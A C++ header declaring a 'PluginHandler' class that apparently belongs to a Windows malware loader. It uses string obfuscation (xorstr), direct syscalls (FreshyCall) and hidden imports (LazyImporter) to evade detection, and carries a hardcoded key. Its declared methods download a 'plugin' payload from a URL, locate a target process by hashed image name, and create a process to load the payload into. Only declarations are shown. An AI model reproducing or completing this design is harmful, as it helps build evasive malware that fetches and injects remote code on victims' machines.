#pragma once

#define _CRT_SECURE_NO_WARNINGS

#include <thread>
#include <windows.h>
#include <Wininet.h>

#include "../Libraries/xorstr/xorstr.hpp"
#include "../Libraries/ntdll.h"
#include "../Libraries/FreshyCall/syscall.hpp"
#include "../Libraries/LazyImporter/lazy_importer.hpp"

class PluginHandler {
private:
#define PLUGIN_MAX_SIZE 524288

  char Param_1[255]; // normally plugin download URL
  char Param_2[255]; // normally plugin param 1
  char Param_3[255]; // param 2
  char Param_4[255]; // param 3

  char *Key = (char *)"shrnxhslajshdnrjsjdhwbdjehshdj";
  char *PluginPayload = nullptr;
  DWORD PayloadSize = 0;

  HANDLE ProcessHandle;
  HANDLE ThreadHandle;

  void clearPayload();

  DWORD64 djb2(PBYTE str);
  char *wcharToChar(const wchar_t *Source);
  wchar_t *getFileNameFromPath(wchar_t *FullPath);
  HANDLE
  getHandleFromImageName(DWORD64 ImageName);
  wchar_t *getDirectoryFromPath(wchar_t *FullPath, wchar_t *OutBuffer,
                                const size_t OutBufferSize);

  void downloadPlugin();
  void loadPlugin();
  static void startLoading(PluginHandler *Handler);
  bool createProcess();

public:
  PluginHandler(char *Param_1, char *Param_2, char *Param_3, char *Param_4);
  ~PluginHandler();

  static void startLoadingThread(PluginHandler *Handler);
};